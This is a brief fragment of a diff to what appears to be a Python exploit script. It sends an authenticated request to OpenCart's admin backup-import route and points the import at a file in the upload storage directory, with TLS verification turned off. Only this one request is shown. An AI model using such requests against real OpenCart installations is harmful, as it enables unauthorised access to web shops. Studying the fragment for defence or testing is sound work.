+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=950135"
     r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     #print(r.text)
     #print(r)
